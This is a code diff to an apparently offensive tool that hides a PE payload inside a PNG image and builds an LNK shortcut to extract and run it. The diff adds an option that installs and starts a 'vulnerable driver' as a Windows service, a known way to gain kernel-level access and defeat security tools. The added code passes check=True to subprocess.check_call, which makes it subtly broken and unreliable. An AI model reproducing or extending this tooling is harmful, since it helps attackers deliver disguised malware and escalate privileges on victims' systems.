@@ -173,6 +173,18 @@ def create_shortcut(lnk_path, arguments, icon_file="", icon_index=0, working_dir
 
 # ------------------------------------------------------------------------------------------------------------------------
 
+def load_vulnerable_driver(driver_path):
+    print(f"{Fore.WHITE}[i] Loading the vulnerable driver...{Style.RESET_ALL}")
+    try:
+        subprocess.check_call(["sc", "create", "vuln_driver", f"binPath= {driver_path}"], check=True)
+        subprocess.check_call(["sc", "start", "vuln_driver"], check=True)
+        print(f"{Fore.GREEN}[+] Vulnerable driver loaded successfully!{Style.RESET_ALL}")
+    except Exception as e:
+        print_red(f"[!] Failed to load the vulnerable driver: {e}")
+        sys.exit(1)
+
+# ------------------------------------------------------------------------------------------------------------------------
+
 def is_png(file_path):
 
     if not os.path.isfile(file_path):
@@ -245,6 +257,7 @@ def main():
     parser.add_argument('-i', '--input', type=str, required=True, help="Input PE payload file")
     parser.add_argument('-png', '--pngfile', type=str, required=True, help="Input PNG file to embed the PE payload into")
     parser.add_argument('-o', '--output', type=str, required=True, help="Output PNG/LNK file name")
+    parser.add_argument('-d', '--driver', type=str, required=False, help="Path to the vulnerable driver")
     args = parser.parse_args()
 
     # Add file extensions to output files (PNG/LNK)
@@ -270,6 +283,14 @@ def main():
     # create output png file
     xor_key_offset = plant_pe_in_png(args.pngfile, opng_fname, payload_data)
     print(f"[*] {Fore.YELLOW}{opng_fname}{Style.RESET_ALL} is created!")
+
+    # Load vulnerable driver if provided
+    if args.driver:
+        driver_path = os.path.abspath(args.driver)
+        if not os.path.exists(driver_path):
+            print_red(f"[!] '{driver_path}' does not exist")
+            sys.exit(1)
+        load_vulnerable_driver(driver_path)
 
     # create extraction command
     extraction_command = create_lnk_extraction_cmnd(xor_key_offset, opng_fname, args.input)
